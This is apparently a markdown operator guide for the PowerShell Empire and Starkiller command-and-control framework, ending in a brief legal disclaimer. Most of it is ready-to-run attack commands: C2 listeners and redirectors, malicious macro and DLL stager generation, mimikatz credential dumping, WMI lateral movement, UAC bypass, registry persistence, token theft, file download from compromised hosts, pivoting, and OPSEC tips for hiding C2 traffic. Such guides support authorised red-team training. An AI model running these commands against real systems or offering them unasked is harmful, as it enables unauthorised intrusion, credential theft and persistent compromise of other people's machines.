# PowerShell Empire (Starkiller) Guide

```markdown
# PowerShell Empire (Starkiller) C2 Framework Guide

![PowerShell Empire Logo](https://github.com/BC-SECURITY/Empire/raw/master/data/empire.png)

## Table of Contents
1. [Introduction](#introduction)
2. [Installation](#installation)
3. [Basic Usage](#basic-usage)
4. [Listener Types](#listener-types)
5. [Stager Generation](#stager-generation)
6. [Module Usage](#module-usage)
7. [Post-Exploitation](#post-exploitation)
8. [Reporting](#reporting)
9. [Operational Security](#operational-security)
10. [Troubleshooting](#troubleshooting)
11. [Resources](#resources)

---

## Introduction
PowerShell Empire is a post-exploitation framework that includes a pure-PowerShell Windows agent and Python 3 server.

**Key Features**:
- Pure PowerShell agents
- Multiple listener options (HTTP, HTTPS, DNS)
- Modular architecture
- Credential harvesting
- Lateral movement techniques
- Starkiller web GUI (new version)

---

## Installation

### Kali Linux Installation
```bash
sudo apt update && sudo apt install -y powershell-empire starkiller
```

### Manual Installation
```bash
git clone --recursive https://github.com/BC-SECURITY/Empire.git
cd Empire
sudo ./setup/install.sh
```

### Docker Installation
```bash
docker pull bcsecurity/empire:latest
docker run -it -p 1337:1337 -p 5000:5000 bcsecurity/empire:latest
```

### Starting Empire
```bash
# Start server
powershell-empire server

# Start client (in new terminal)
powershell-empire client

# Start Starkiller (web GUI)
starkiller
```
Access Starkiller at `https://localhost:1337` (default creds: empireadmin/password123)

---

## Basic Usage

### Empire Console Commands
```powershell
(Empire) > help                         # Show all commands
(Empire) > listeners                    # List active listeners
(Empire) > uselistener http             # Select listener type
(Empire) > info                         # Show listener options
(Empire) > execute                      # Start listener
(Empire) > agents                       # List active agents
(Empire) > interact <agent_name>        # Interact with agent
```

### Starkiller Web Interface
1. Navigate to `https://localhost:1337`
2. Create listeners in "Listeners" tab
3. Generate stagers in "Stagers" tab
4. Manage agents in "Agents" tab

---

## Listener Types

### HTTP/HTTPS Listeners
```powershell
uselistener http
set Name MyListener
set Host http://yourdomain.com
set Port 80
execute
```

### DNS Listener
```powershell
uselistener dns
set Name DNSListener
set Host yourdomain.com
execute
```

### Redirector Setup
```powershell
uselistener http_hop
set Name Redirector
set RedirectTarget http://real_c2_server:80
execute
```

---

## Stager Generation

### Launcher Generation
```powershell
usestager multi/launcher
set Listener MyListener
generate
```

### Office Macro
```powershell
usestager windows/macro
set Listener MyListener
generate
```

### DLL Stager
```powershell
usestager windows/dll
set Listener MyListener
generate
```

### Web Delivery (One-Liner)
```powershell
usestager windows/launcher_bat
set Listener MyListener
generate
```

---

## Module Usage

### Credential Harvesting
```powershell
usemodule credentials/mimikatz/logonpasswords
execute
```

### Lateral Movement
```powershell
usemodule lateral_movement/invoke_wmi
set ComputerName TARGET-PC
set Listener MyListener
execute
```

### Privilege Escalation
```powershell
usemodule privesc/bypassuac
set Listener MyListener
execute
```

### Persistence
```powershell
usemodule persistence/elevated/registry
set Listener MyListener
execute
```

---

## Post-Exploitation

### Common Agent Commands
```powershell
(Empire: AGENT_NAME) > shell whoami     # Execute shell command
(Empire: AGENT_NAME) > ps               # List processes
(Empire: AGENT_NAME) > steal_token      # Steal process token
(Empire: AGENT_NAME) > download file.txt # Download file
(Empire: AGENT_NAME) > upload file.txt   # Upload file
(Empire: AGENT_NAME) > sc               # Screenshot
```

### Pivoting
```powershell
(Empire: AGENT_NAME) > autoroute -s 10.10.10.0/24
(Empire: AGENT_NAME) > socks 1080
```

---

## Reporting

### Generate Reports
```powershell
report
```

### Export Results
```powershell
export <report_type> <filename>
```

### Starkiller Reporting
1. Navigate to "Reporting" tab
2. Generate HTML/JSON reports
3. Export agent timelines

---

## Operational Security

### OPSEC Considerations
1. Always use HTTPS listeners
2. Change default API keys
3. Use redirectors for C2 traffic
4. Regularly rotate listeners
5. Use custom user agents and headers

### Cleanup
```powershell
(Empire: AGENT_NAME) > remove
(Empire) > kill <listener_name>
```

---

## Troubleshooting

### Common Issues
**Agent not connecting**:
- Check firewall rules
- Verify listener is running
- Test connectivity to listener port

**Certificate errors**:
```powershell
set CertPath /path/to/cert.pem
```

**Starkiller not loading**:
```bash
sudo systemctl restart starkiller
```

---

## Resources
1. [Official Documentation](https://bc-security.org/empire-docs/)
2. [GitHub Repository](https://github.com/BC-SECURITY/Empire)
3. [Starkiller Guide](https://github.com/BC-SECURITY/Starkiller)
4. [C2 Matrix](https://www.thec2matrix.com/matrix)
5. [Red Team Field Manual](https://www.amazon.com/Rtfm-Red-Team-Field-Manual/dp/1494295504)
```

### How to Use This Guide:
1. Save as `empire_guide.md`
2. Customize for your operational needs
3. Always test in controlled environments
4. Follow ethical hacking guidelines

**Legal Disclaimer**: Only use on systems you own or have explicit permission to test. Unauthorized use may violate laws.